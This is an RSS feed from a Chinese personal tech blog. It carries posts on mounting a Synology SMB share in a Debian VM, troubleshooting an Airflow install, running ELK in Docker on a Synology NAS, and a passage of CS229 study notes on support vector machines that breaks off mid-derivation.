<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on 雪地</title>
		<link>https://yinzo.github.io/posts/</link>
		<description>Recent content in Posts on 雪地</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>zh-CN</language>
		<lastBuildDate>Wed, 29 Jan 2020 14:52:00 +0800</lastBuildDate>
		<atom:link href="https://yinzo.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>群晖虚拟机挂载群晖smb目录</title>
			<link>https://yinzo.github.io/posts/%E7%BE%A4%E6%99%96%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8C%82%E8%BD%BD%E7%BE%A4%E6%99%96smb%E7%9B%AE%E5%BD%95/</link>
			<pubDate>Wed, 29 Jan 2020 14:52:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E7%BE%A4%E6%99%96%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8C%82%E8%BD%BD%E7%BE%A4%E6%99%96smb%E7%9B%AE%E5%BD%95/</guid>
			<description>为了方便在 Windows 上写 Linux 代码，尝试了 WSL，但是又希望关机之后工作区能继续保持，甚至程序继续运行，因此在群晖上运行了一个 Debian 10 的虚拟机（不是Dock</description>
			<content type="html"><![CDATA[<p>为了方便在 Windows 上写 Linux 代码，尝试了 WSL，但是又希望关机之后工作区能继续保持，甚至程序继续运行，因此在群晖上运行了一个 Debian 10 的虚拟机（不是Docker）。但是虚拟机的话，不像 Docker 那么方便就能挂载群晖上的目录，因此只好通过群晖 smb 服务来挂载远程目录。以下就默认大家的 smb 服务是已经开启的了。</p>
<ol>
<li>
<p>安装 <code>cifs-utils</code></p>
<pre><code> sudo apt install cifs-utils
</code></pre>
</li>
<li>
<p>配置 smb 的用户名密码文件，我这里把这个文件放在了 /root/smb_passwd，并且权限是 root 只读。</p>
<pre><code> sudo vim /root/smb_passwd
</code></pre>
<p>以下是文件内容</p>
<pre><code> username=blablabla
 password=blablabla
</code></pre>
<p>保存之后修改文件权限</p>
<pre><code> sudo chmod 400 /root/smb_passwd
</code></pre>
</li>
<li>
<p>执行挂载目录，我这边挂载到 <code>/home/project</code> 目录，没有报错并且 <code>ls</code>看一下没问题就是成功了。我这边指定了挂载的用户和组权限，如果不需要则删除uid和gid配置即可。</p>
<pre><code> mkdir /home/project
 mount -t cifs -o credentials=/root/smb_passwd,uid=1000,gid=1000 //&lt;你的群晖ip地址&gt;/project /home/project
</code></pre>
</li>
<li>
<p>接下来配置开机自动挂载</p>
<pre><code> sudo vim /etc/fstab
</code></pre>
<p>增加以下内容</p>
<pre><code> # mount project dir on synology smb server
 //&lt;你的群晖ip地址&gt;/project /home/project   cifs    credentials=/root/smb_passwd,uid=1000,gid=1000    0       0
</code></pre>
</li>
</ol>
]]></content>
		</item>
		
		<item>
			<title>Airflow 折腾实录</title>
			<link>https://yinzo.github.io/posts/airflow-%E6%8A%98%E8%85%BE%E5%AE%9E%E5%BD%95/</link>
			<pubDate>Thu, 16 Jan 2020 22:15:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/airflow-%E6%8A%98%E8%85%BE%E5%AE%9E%E5%BD%95/</guid>
			<description>因为未知原因，corntab 无法在我群晖 docker 内的 ubuntu 上正常运行。懒得 debug 了，正好打算熟悉一下部门即将开始使用的 airflow ，部署一个用来替代 crontab。</description>
			<content type="html"><![CDATA[<p>因为未知原因，corntab 无法在我群晖 docker 内的 ubuntu 上正常运行。懒得 debug 了，正好打算熟悉一下部门即将开始使用的 airflow ，部署一个用来替代 crontab。</p>
<h2 id="安装">安装</h2>
<p>安装完执行 <code>airflow initdb</code>提示 UnicodeDecodeError。<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8xm9lmuj30ut0dd42h.jpg" alt="1579183227586"></p>
<p>简单 debug 了下，<code>/usr/local/lib/python2.7/dist-packages/airflow/configuration.py</code> 的607行 <code>conf.read</code> 增加 <code>encoding </code>参数，指定 <code>utf8</code>。<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8xndguwj30q40hc0vm.jpg" alt="1579183993464"></p>
<p>问题解决</p>
<p>后记：后来思考了下，问题的原因估计是 docker 内 ubuntu 的默认 locale 为 POSIX，导致了这个问题。<strong>建议直接修改成正常的 locale 比如 en-US.UTF8</strong>，应该就不会出现这个报错了。</p>
<p>下一个报错。</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8xlefmvj30u50cqtcb.jpg" alt="1579183367728"></p>
<p>google 了一下，看起来是 werkzeug 的版本不对，<code>pip install werkzeug==0.15.4</code> 解决问题，成功执行<code>airflow initdb</code>。</p>
<p>正常启动 webserver 和 scheduler，没什么可说的，可以选择用 nohup 后台启动或者你开两个终端分别启动，这俩东西默认都是保持前台的，真不现代。</p>
]]></content>
		</item>
		
		<item>
			<title>在群晖 DS218&#43; 的 Docker 环境上运行 ELK</title>
			<link>https://yinzo.github.io/posts/%E5%9C%A8%E7%BE%A4%E6%99%96-ds218&#43;-%E7%9A%84-docker-%E7%8E%AF%E5%A2%83%E4%B8%8A%E8%BF%90%E8%A1%8C-elk/</link>
			<pubDate>Sun, 05 Jan 2020 19:45:55 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/%E5%9C%A8%E7%BE%A4%E6%99%96-ds218&#43;-%E7%9A%84-docker-%E7%8E%AF%E5%A2%83%E4%B8%8A%E8%BF%90%E8%A1%8C-elk/</guid>
			<description>安装Docker套件 下载ELK映像，此处我使用官方映像的 6.4.0 版本，在注册表中搜索，双击选择版本后下载。下载过程中先进行下列设置。 启用 admin 用户，若</description>
			<content type="html"><![CDATA[<ol>
<li>安装Docker套件</li>
<li>下载ELK映像，此处我使用官方映像的 6.4.0 版本，在注册表中搜索，双击选择版本后下载。下载过程中先进行下列设置。<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8tvfs3lj30ta0n6tax.jpg" alt="1578123848856"></li>
<li>启用 admin 用户，若没有设置过密码请修改 admin 密码<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8y0hoatj30rj0g1js6.jpg" alt="1578123112161"><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8y9mid2j30pa0ee0tq.jpg" alt="1578123138073"></li>
<li>启用 DSM 的 ssh 登录<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8yd1j33j30rn0g1mym.jpg" alt="1578123013114"></li>
<li>通过 ssh 登录 DSM，登录用户为 admin，密码为你刚刚设置的密码。</li>
<li>登录到 admin 用户之后通过 <code>sudo -i</code> 命令切换到 root 用户，首次登录 root 用户会要求你设置初始密码。</li>
<li>切换到 root 用户之后，修改 <code>/etc/sysctl.conf</code>，增加（或修改） <code>vm.max_map_count=262144</code>一行，保存退出。之后 DSM 重启也不会恢复此设置。</li>
<li>此时该设置还未生效，索性再执行 <code>sysctl -w vm.max_map_count=262144</code> 命令直接修改配置。</li>
</ol>
<h2 id="elasticsearch">ElasticSearch</h2>
<ol>
<li>等待ES映像下载完成后启动，会失败，查看日志应该能找到<code>java.lang.UnsupportedOperationException: seccomp unavailable: CONFIG_SECCOMP not compiled into kernel, CONFIG_SECCOMP and CONFIG_SECCOMP_FILTER are needed</code>这样的报错提示<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8tse64hj30wq0hk79k.jpg" alt="1578124080112">这是需要我们手动修改 es 配置，加上这一行 <code>bootstrap.system_call_filter: false</code></li>
<li>再次启动刚刚失败退出的 es 容器，在容器还没报错退出之前，使用终端机，点击“新增”按钮创建一个 bash 端口，快速修改 /usr/share/elasticsearch/config/elasticsearch.yml 文件，加入<code>bootstrap.system_call_filter: false</code> 这行配置，保存退出。</li>
<li>保存退出之后当次启动仍会失败，因为修改完之前配置已经被读取启动了。再次启动该容器，观察日志，看到以下日志内容基本就代表成功启动了<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8yaqf9kj30wt0hjq8l.jpg" alt="1578124240959"></li>
<li>可以通过浏览器访问 es 容器对应的9200端口，我这里看到我 es 容器的 9200 端口对应的是 32867 端口<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8ybqb15j30wl0hgjt3.jpg" alt="1578124357631">因此访问 {NAS的IP}:32867 端口即可看到图中的返回<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8y87krgj30fo09qdgu.jpg" alt="1578124439235">代表 ES 配置完成。</li>
</ol>
<h2 id="kibana">Kibana</h2>
<ol>
<li>接下来启动 kibana 容器，启动时建议设置端口映射，因为经常需要通过本地浏览器访问 kibana，使用一个固定端口比较方便，此处我使用 kibana 原本的端口 5601 <img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8y93azdj30hx0f674s.jpg" alt="1578124588101"></li>
<li>设置容器链接，左边容器名称选择你刚刚启动的 es 容器名称，右侧别名建议使用 <code>elasticsearch</code>（如果你想要手动修改 kibana 配置文件的话，也可以自己设置为别的别名）<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8tyc8o1j30hv0f8wez.jpg" alt="1578124674708"></li>
<li>然后启动即可，观察 kibana 容器的日志输出，如图代表启动完成<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8tua16pj30wq0hk79k.jpg" alt="1578124860646">可以使用浏览器访问 {NAS的IP}:5601 端口（根据刚刚第一步配置的端口映射中左边的本地端口），即可看到 kibana 的界面<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8y6m8nij31e80r27al.jpg" alt="1578124944815"></li>
</ol>
<h2 id="logstash">Logstash</h2>
<ol>
<li>新建一个共享文件夹，专门存放用于导入 Logstash 的数据文件，创建时建议关闭回收站功能，可能会影响程序读写删除性能<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8y724atj30m60fzq3u.jpg" alt="1578152917909"></li>
<li>使用 File Station 套件，右键刚刚创建的共享文件夹，进入属性界面<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8u03pvsj30p20efgmo.jpg" alt="1578153400428"></li>
<li>点击权限、新增，选择 Everyone 组后选择读取权限，并勾选左下角应用到文件夹、子文件夹及文件，保存<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8y7r2tzj30ok0g3myu.jpg" alt="1578153468868"></li>
<li>创建 Logstash 容器，创建时在高级设置中添加 es 容器的链接，同 kibana 部分的第二步。</li>
<li>在“卷”标签页中，增加挂载刚刚新建的数据目录，根据习惯填写装载路径<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbb8tqk7sqj30ht0f2q3k.jpg" alt="1578224503795"></li>
<li>启动容器，新建一个 bash 终端，根据需求修改 <code>/usr/share/logstash/pipeline/</code> 中的配置文件。</li>
</ol>
<h2 id="后记">后记</h2>
<p>尝试在没有增加内存的 DS218+ 上搭建 ELK，虽然能够成功运行，但是内存使用率一直会保持在80 以上，并且还会让正常的索引任务失败，提示内存不足，建议还是增加内存之后再玩这个吧。</p>
]]></content>
		</item>
		
		<item>
			<title>CS229 学习笔记 Part 3</title>
			<link>https://yinzo.github.io/posts/cs229-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-part-3/</link>
			<pubDate>Wed, 07 Jun 2017 14:35:00 +0800</pubDate>
			
			<guid>https://yinzo.github.io/posts/cs229-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-part-3/</guid>
			<description>CS229 对于 SVM 的理论解释是我学习到的最详细也是最好的一份资料了，对比对象有周志华《机器学习》、《机器学习实战》、Coursera 上的 Machine Learning 等。相当推</description>
			<content type="html"><![CDATA[<!-- raw HTML omitted -->
<p>CS229 对于 SVM 的理论解释是我学习到的最详细也是最好的一份资料了，对比对象有周志华《机器学习》、《机器学习实战》、Coursera 上的 Machine Learning 等。相当推荐学习 CS229。</p>
<p>分类间隔 (Margin) 和 SVM 的优化目标『最大化分类间隔』这里就不多说了，很好理解，主要还是记录 CS229 中学到的新内容。一个数据点离分类边界 (decision boundary) 越远，则确信度越高。我们的优化目标也相当于寻找一个远离所有数据点的分类边界，当然，前提是这个分类边界得到的分类都正确。</p>
<p>SVM 的一些特殊定义也提及一下，</p>
<ul>
<li>$y$ 的取值不是 ${0,1}$ 而是 ${-1,1}$。</li>
<li>假设函数 $h_{w,b}(x) = g(w^Tx+b)$ 中，我们把截距项单独写出来，便与后续的计算。</li>
<li>我们的分类器输出结果会直接是 1 或 -1，不像 Logistic 回归那样先输出 $y$ 是某一类的概率。</li>
</ul>
<!-- raw HTML omitted -->
<p>函数间隔 $\hat{\gamma}$ 的定义如下
$$\hat{\gamma}^{(i)} = y^{(i)}(w^Tx+b)$$</p>
<p>$$\hat{\gamma} = \min_{i=1,\cdots,m} \hat{\gamma}^{(i)}$$</p>
<p>函数间隔，是所有数据点的函数输出中的最小值，函数间隔越大，说明这个点分类的自信越高。但是可以发现，我们等比例放大参数 $w$ 和 $b$  的数值大小，可以使得函数间隔变大，并且分类间隔直线的位置并不会移动。于是我们又定义了几何间隔</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbf0kxb63j30p30m50tr.jpg" alt=""></p>
<p>注意图中的点 A，我们需要求 A 到分类边界的距离 $\gamma^{(i)}$，就是我们现在需要求的值。</p>
<p>因为 A 代表着 $x^{(i)}$， 所以我们可以得到点 B 的公式为 $x^{(i)} - \gamma^{(i)} \cdot w/|w|$，并且点 B 在分类边界上，我们有 $w^Tx+b=0$，因此</p>
<p>$$w^T\left(x^{(i)}-\gamma^{(i)}\frac{w}{|w|}\right)+b=0$$</p>
<p>$$\gamma^{(i)} = \frac{w^Tx^{(i)}+b}{|w|} = \left(\frac{w}{|w|}\right)^Tx^{(i)}+\frac{b}{|w|}$$</p>
<p>再把函数的正负性考虑进去，最终我们得到</p>
<p>$$ \gamma^{(i)} = y^{(i)}\left(\left(\frac{w}{|w|}\right)^Tx^{(i)}+\frac{b}{|w|}\right) $$</p>
<p>注意如果 $|w| = 1$，则函数间隔等于几何间隔——这给了我们一个联系起这两种间隔的思路。并且，几何间隔并不受参数的等比缩放影响，这个特性在后面的推导中很有用。比如说我们在拟合 w 和 b 的时候，我们需要对他进行一个缩放以满足 \ $|w| = 1$ 这个约束，那么我们并不需要担心几何间隔会因此改变。</p>
<p>最后，对于一组大小为 m 的训练集，我们同样定义</p>
<p>$$\gamma = \min_{i=1,\cdots,m}\gamma^{(i)}$$</p>
<!-- raw HTML omitted -->
<p>当我们假设数据是线性可分的时候，也就是存在一个超平面能够将正类和负类分隔开，这时我们如何找到这个最大化集合间隔的分类器呢，有以下优化问题</p>
<p>$$\begin{eqnarray}
\max_{\gamma,w,b}&amp;&amp;\gamma \nonumber \<br>
s.t. &amp; &amp;y^{(i)}(w^Tx^{(i)}+b)\geq \gamma,i=1,\cdots,m \nonumber \<br>
&amp;&amp;|w|=1 \nonumber \<br>
\end{eqnarray}$$</p>
<p>我们限制了 $|w|=1$，所以几何间隔和函数间隔此时是相等的。因此，解决这个优化问题，我们能够求出对于这个训练集最大的几何间隔。但是，&ldquo;$|w|=1$“ 这个限制不怎么友好（non-convex），我们无法套用现成的优化求解算法来解决它，所以我们尝试把它变形一下</p>
<p>$$\begin{eqnarray}\max_{\hat{\gamma},w,b} &amp;&amp;\frac{\hat{\gamma}}{|w|} \nonumber \<br>
s.t. &amp;&amp; y^{(i)}(w^Tx^{(i)}+b)\geq \hat{\gamma},\ \ i=1,\cdots,m \nonumber \<br>
\end{eqnarray}$$</p>
<p>现在我们尝试最大化  $\hat{\gamma}/|w|$，这个优化问题和上面的那个是等价的，并且我们成功抛弃掉了那个不友好的限制条件。但是，现在变成我们的目标函数不怎么友好了 (non-convex)。</p>
<p>让我们继续尝试变形。回想起我们能够随意等比例缩放 $w,b$，这非常关键。我们限制$\hat{\gamma}=1$，则我们的优化目标可以变为最大化 $\hat{\gamma}/|w| = 1/|w|$，也就相当于最小化 $|w|^2$</p>
<p>$$\begin{eqnarray}
\min_{\gamma,w,b} &amp;&amp;\frac{1}{2}|w|^2 \nonumber \\<br>
s.t. &amp;&amp; y^{(i)}(w^Tx^{(i)}+b)\geq 1,\ \ i=1,\cdots,m \nonumber \\<br>
\end{eqnarray}$$</p>
<p>现在我们终于将问题转化为一个能够使用现成计算包解决的优化问题了。上面的优化问题是一个凸二次优化问题，并且只有一个线性约束。但是相比使用现成计算包直接解决这个优化问题，我们还有一个解决办法，并且解决过程中还引出了更加重要的 kernel 概念。</p>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>有『等式约束条件』和『不等式约束条件』下的优化问题，能够通过拉格朗日方法，转换为无约束的拉格朗日函数优化问题。</p>
<p>比如说</p>
<p>$$\begin{eqnarray}
\min_w &amp;&amp; f(w)\nonumber \\<br>
s.t. &amp;&amp;g_i(w) \leq 0, \ \ i=1,\cdots,k\nonumber \\<br>
&amp;&amp;h_i(w)=0, \ \ i=1,\cdots,l \nonumber \\<br>
\end{eqnarray}$$
通过引入拉格朗日乘数$\alpha_i, \beta_i$ 我们能够得到拉格朗日函数</p>
<p>$$\mathcal{L}(w,\alpha,\beta) = f(w) + \sum^k_{i=1}\alpha_ig_i(w)+\sum^l_{i=1}\beta_i h_i(w)$$</p>
<p>此时，若我们对拉格朗日函数求最大值的优化问题</p>
<p>$$\theta_{\mathcal{P}}(w) = \max_{\alpha,\beta:\alpha_i \geq 0} \mathcal{L}(w,\alpha,\beta)$$</p>
<p>我们发现，当 $h_i(w)$ 等于零的时候，即 $w$ 的取值符合原函数约束时，拉格朗日函数等于原函数；当$w$ 的取值不符合原函数约束时，即 $h_i(w)$ 不等于零的时候，总能通过使 $\beta_i$ 等于正无穷或负无穷，使得 $\theta_{\mathcal{P}}(w)$ 等于正无穷。</p>
<p>$$ \theta_{\mathcal{P}}(w) =<br>
\begin{cases}
f(w)   &amp;若 w 满足原问题约束 \\<br>
\infty &amp;其他 \\<br>
\end{cases}$$</p>
<p>利用这个性质，我们再对 $\theta_{\mathcal{P}}(w)$ 函数化为最小值的优化问题，则得到</p>
<p>$$\min_w \theta_{\mathcal{P}}(w) = \min_w \max_{\alpha,\beta:\alpha_i \geq0} \mathcal{L}(w,\alpha,\beta)$$</p>
<p>求解这一个优化问题，我们就将得到在满足原问题约束条件下，对于原目标函数 $f(w)$ 的最小值优化问题的解，因为不符合约束条件的参数会使得函数变为正无穷，从而被符合约束条件的参数筛选掉。</p>
<p>$$\min_w \max_{\alpha,\beta:\alpha_i \geq0} \mathcal{L}(w,\alpha,\beta)$$</p>
<p>这个优化问题，就称为拉格朗日函数的原始问题 (primal problem)。</p>
<!-- raw HTML omitted -->
<p>那么，对偶问题是什么呢。可以看到，原始问题中有两个最值优化步骤。将这两个最值优化步骤对调一下顺序，就成为了拉格朗日函数的对偶问题 (dual problem)</p>
<p>我们称，原始问题最终求得的最优解为 $p^<em>$，对偶问题的最优解为 $d^</em>$。我们很容易想到</p>
<p>$$d^* = \max_{\alpha,\beta:\alpha_i \geq0} \min_w \mathcal{L}(w,\alpha,\beta) \leq \min_w \max_{\alpha,\beta:\alpha_i \geq0} \mathcal{L}(w,\alpha,\beta) = p^*$$</p>
<p>并且，在一定条件下，我们有</p>
<p>$$d^* = p^*$$</p>
<!-- raw HTML omitted -->
<p>若满足以下假设，必定存在  $w^*, \alpha^*, \beta^*$ 是原始问题的解。</p>
<ol>
<li>函数  $f$ 和 $g_i$ 都是凸函数</li>
<li>$h_i$ 函数是仿射函数（$h_i$ 满足 $h_i(w) = a_i^Tw+b_i$ 形式，称 $h_i$ 为仿射函数 (Affine)）</li>
</ol>
<p>并且，若 $w^*, \alpha^*, \beta^*$ 同时满足 KKT 条件，则此解同时是对偶问题和原始问题的解。</p>
<p>$$\begin{eqnarray}
​    \frac{\partial}{\partial w_i}\mathcal{L}(w^*,\alpha^*,\beta^*) &amp;=&amp; 0,i=1,\cdots,n     \\<br>
​    \frac{\partial}{\partial \beta_i}\mathcal{L}(w^*,\alpha^*,\beta^*) &amp;=&amp; 0,i=1,\cdots,l     \\<br>
​    \alpha_i^*g_i(w^*) &amp;=&amp; 0, i=1,\cdots,k  \\<br>
​    g_i(w^*) &amp;\leq&amp; 0, i=1,\cdots,k  \\<br>
​    \alpha^* &amp;\geq&amp; 0, i=1,\cdots,k  \\<br>
\end{eqnarray}$$</p>
<!-- raw HTML omitted -->
<p>现在，我们尝试使用拉格朗日方法来解决我们的最优间隔分类器优化问题</p>
<p>$$\min_{\gamma,w,b} \frac{1}{2} |w|^2$$</p>
<p>$$s.t.\ \ y^{(i)}（w^Tx^{(i)} +b)\geq 1,\ i=1,\cdots,m$$</p>
<p>我们将约束条件化为以下形式</p>
<p>$$g_i(w) = -y^{(i)}(w^Tx^{(i)}+b) + 1 \leq 0$$</p>
<p>则我们根据 KKT 条件中的公式(3)得知，只有当函数间隔恰好等于 1 时，$g_i(w) = 0$，$\alpha_i$ 才有可能大于0. 我们称 $\alpha_i &gt; 0$ 的数据点为支持向量 (support vectors)，也就是支持向量机的名称由来。并且支持向量的数量一般远少于训练集样本数量，这是后续算法优化的一个很重要的特性。</p>
<p>我们求出原优化问题的拉格朗日函数</p>
<p>$$ \begin{equation} \mathcal{L}(w,b,\alpha) = \frac{1}{2}|w|^2-\sum^m_{i=1}\alpha_i[y^{(i)}(w^Tx^{(i)}+b)-1]  \end{equation} $$</p>
<p>我们求解对偶问题，首先使用 $w,b$ 为参数，求解拉格朗日函数的最小值。则我们求函数分别对于 c$w,b$ 的偏导数并使其等于零</p>
<p>$$\nabla_w\mathcal{L}(w,b,\alpha) = w-\sum^m_{i=1}\alpha_iy^{(i)}x^{(i)}= 0$$</p>
<p>$$ \begin{equation} w=\sum^m_{i=1}\alpha_iy^{(i)}x^{(i)} \end{equation} $$</p>
<p>$$ \begin{equation} \frac{\partial}{\partial b}\mathcal{L}(w,b,\alpha) = \sum^m_{i=1} \alpha_iy^{(i)}=0\end{equation} $$</p>
<p>然后我们将他们代入原拉格朗日函数中，进行下一步最值求解</p>
<p>$$\mathcal{L}(w,b,\alpha) = \sum^m_{i=1}\alpha_i - \frac{1}{2}\sum^m_{i,j=1}y^{(i)}y^{(j)}\alpha_i\alpha_j(x^{(i)})^Tx^{(j)}$$</p>
<p>需要注意的是，此时 KKT 条件中的公式(5)，以及刚刚求出的公式(8) 成为了现在的最值优化问题的新约束。则我们得到</p>
<p>$$\begin{eqnarray}
\max_a &amp;&amp;W(\alpha) = \sum^m_{i=1}\alpha_i-\frac{1}{2}\sum^m_{i,j=1}y^{(i)}y^{(j)}\alpha_i\alpha_j\langle x^{(i)},x^{(j)}\rangle \nonumber \
s.t. &amp;&amp; \alpha_i \geq 0,\ \ i=1,\cdots,m \nonumber \<br>
&amp;&amp;\sum^m_{i=1}\alpha_iy^{(i)} = 0 \nonumber \<br>
\end{eqnarray}$$</p>
<p>最终我们求出 $\alpha_i$ 的最优值，代入到公式(7) 求得 $w$ 的最优值，再将 $w, \alpha_i$ 代入原拉格朗日函数公式(6) 中，求得</p>
<p>$$ \begin{equation} b^* = -\frac{\max_{i:y^{(i)}=-1}w^*Tx^{(i)} + \min_{i:y^{(i)}=1} w^{*T}x^{(i)}}{2} \end{equation} $$</p>
<p>则此时我们已经求得了我们原优化问题的最优解，可喜可贺。</p>
<!-- raw HTML omitted -->
<p>还能有什么优化的地方？我们的分类器的可用性还存在一个前提，数据必须线性可分。如果线性不可分呢？我们引入了『核』的概念，用来对输入数据进行一个特征转换。我们定义特征函数</p>
<p>$$\phi(x) = \begin{bmatrix}
x\<br>
x^2\<br>
x^3
\end{bmatrix}$$</p>
<p>回头看我们的公式(7)，如果将它代入到我们的假设函数 \(w^Tx+b\) 中，我们得到</p>
<p>$$\begin{eqnarray}
​    w^Tx+b &amp;=&amp; \left( \sum^m_{i=1}\alpha_iy^{(i)}x^{(i)} \right)^Tx+b  \\<br>
&amp;=&amp; \sum^m_{i=1}\alpha_iy^{(i)}\langle x^{(i)}, x\rangle  +b  \\<br>
\end{eqnarray}$$</p>
<p>将假设函数转化成了输入数据和所有支持向量的点积的形式（$\langle x^{(i)},x\rangle$ 指 $x^{(i)}$ 和 $x$ 的点积），于是我们就可以将这个点积替换成一个特征向量的点积了。</p>
<p>我们再定义一个关于 $x^{(i)}$ 和 $x$ 的函数 $K(x,z)$</p>
<p>$$K(x,z) = \phi(x)^T\phi(z)$$</p>
<p>这个函数，我们就称为__核函数__。我们现在只需要将公式(11)中的点积替换成核函数，我们的 SVM 就可以处理非线性可分的数据集了。</p>
<p>为什么我们使用核函数，而不是直接套用特征向量的点积呢？让我们看下面一个例子</p>
<p>$$K(x,z) = (x^Tz)^2$$</p>
<p>也可以写成下面这个形式</p>
<p>$$\begin{eqnarray}
K(x,z) &amp;=&amp; \left(\sum^n_{i=1}x_iz_i \right) \left(\sum^n_{j=1}x_jz_j \right) \nonumber \\<br>
&amp;=&amp;\sum^n_{i=1} \sum^n_{j=1}x_ix_jz_iz_j \nonumber \\<br>
&amp;=&amp;\sum^n_{i,j=1}(x_ix_j)(z_iz_j)\nonumber \\<br>
\end{eqnarray}$$</p>
<p>化为特征向量点积的形式，我们可以得到这个核函数对应的特征向量是这个形式的</p>
<p>$$\phi(x) = \begin{bmatrix}
x_1x_1\<br>
x_1x_2\<br>
x_1x_3\<br>
x_2x_1\<br>
x_2x_2\<br>
x_2x_3\<br>
x_3x_1\<br>
x_3x_2\<br>
x_3 x_3
\end{bmatrix}$$</p>
<p>我们可以发现，直接使用特征向量点积，计算复杂度为 $O(n^2)$，而核函数形式的计算复杂度仅为 O(n)。所以使用核函数，能够大幅优化计算复杂度。</p>
<p>那么，是否所有的函数都能作为核函数呢？当然不是。</p>
<p>假设 $K$ 是一个合法核函数，并定义核函数矩阵 $K_{ij} = K(x^{(i)},x^{(j)})$。</p>
<p>则有 $K_{ij} = K(x^{(i)},x^{(j)}) =  \phi(x^{(i)})^T\phi(x^{(j)}) = \phi(x^{(j)})^T\phi(x^{(i)}) = K(x^{(j)},x^{(i)}) = K_{ji}$</p>
<p>所以，<strong>核函数矩阵必须是对称的</strong></p>
<p>然后，我们使用一个任意向量 $z$，有</p>
<p>$$\begin{eqnarray} z^TKz &amp;=&amp; \sum_i\sum_jz_iK_{ij}z_j \nonumber \\<br>
&amp;=&amp;\sum_i\sum_jz_i \phi(x^{(i)})^T \phi(x^{(j)}) z_j \nonumber \\<br>
&amp;=&amp;\sum_i\sum_jz_i \sum_k \phi_k(x^{(i)}) \phi_k(x^{(j)}) z_j \nonumber \\<br>
&amp;=&amp;\sum_k\sum_i\sum_j z_i \phi_k(x^{(i)}) \phi_k(x^{(j)}) z_j \nonumber \\<br>
&amp;=&amp;\sum_k\left(\sum_i z_i\phi_k(x^{(i)})\right)^2 \nonumber \\<br>
&amp;\geq&amp; 0 \nonumber
\end{eqnarray}$$</p>
<p>所以，__核函数矩阵__是半正定的。</p>
<p>需要注意的是，核函数的概念并不是专门为 SVM 提出的，它的概念比 SVM 要广得多。实际上你可以将任何学习算法中的点积替换成核函数，就能使得这个学习算法支持高维度特征学习。</p>
<!-- raw HTML omitted -->
<p>我们的分类器一直以来都有一个限制条件，那就是分类边界必须能够正确的分类所有的样本。我们知道现实中的样本，绝大部分都存在着噪音数据。如果出现了噪音数据，就会导致 SVM 的分类边界很不合理，如下图所示</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbf06krc8j30gj01u748.jpg" alt="14968564739074">为了解决这个问题，我们加入了一个 $l1$ 正则项：</p>
<p>$$\begin{eqnarray}
\min_{\gamma,w,b} &amp;&amp;\frac{1}{2}|w| ^2+C\sum^m_{i=1}\xi_i \nonumber \\<br>
s.t. &amp;&amp; y^{(i)}(w^Tx^{(i)}+b)\geq1-\xi_i,i=1,\cdots,m \nonumber \\<br>
&amp;&amp; \xi_i\geq0,\ i=1,\cdots,m \nonumber \\<br>
\end{eqnarray}$$</p>
<p>这使得样本的函数间隔能够小于1 （甚至为负数）。其中的参数 $C$ 代表了两个目标权重的权衡：</p>
<ol>
<li>使所有样本的函数间隔大于1</li>
<li>最小化 $|w|^2$</li>
</ol>
<p>$C$ 越大，则优化目标越偏向目标1，即最原始的，强迫所有样本必须分类正确的模型。</p>
<p>在新的优化目标下，我们的 KKT 条件有一点改变：</p>
<p>$$\begin{eqnarray}
\alpha_i = 0 &amp;\Rightarrow&amp; y^{(i)}(w^Tx^{(i)}+b)\geq1  \\<br>
\alpha_i = C &amp;\Rightarrow&amp; y^{(i)}(w^Tx^{(i)}+b)\leq 1 \\<br>
0&lt;\alpha_i &lt;C &amp;\Rightarrow&amp; y^{(i)}(w^Tx^{(i)}+b) = 1 \\<br>
\end{eqnarray}$$</p>
<!-- raw HTML omitted -->
<p>SMO 算法全称 Sequential minimal optimization，提供了一种有效的方法来解决 SVM 的对偶问题。在介绍 SMO 算法之前，我们先了解另一个算法。</p>
<!-- raw HTML omitted -->
<p>假设你正在尝试解决一个无约束优化问题</p>
<p>$$\max_aW(\alpha_1,\alpha_2,\cdots,\alpha_m)$$</p>
<p>新算法逻辑如下：<img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbf8j1p8ij30gv053mxg.jpg" alt=""></p>
<p>可以看到在循环的最里层，我们固定了除了 $\alpha_i$ 以外的所有参数，然后仅通过 $\alpha_i$ 来优化函数 $W$。以下是一个坐标上升算法实战中的情形</p>
<p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbbffuzlg9j30gy05tdgm.jpg" alt=""></p>
<!-- raw HTML omitted -->
<p>这是我们准备解决的对偶优化问题：</p>
<p>$$\begin{eqnarray}
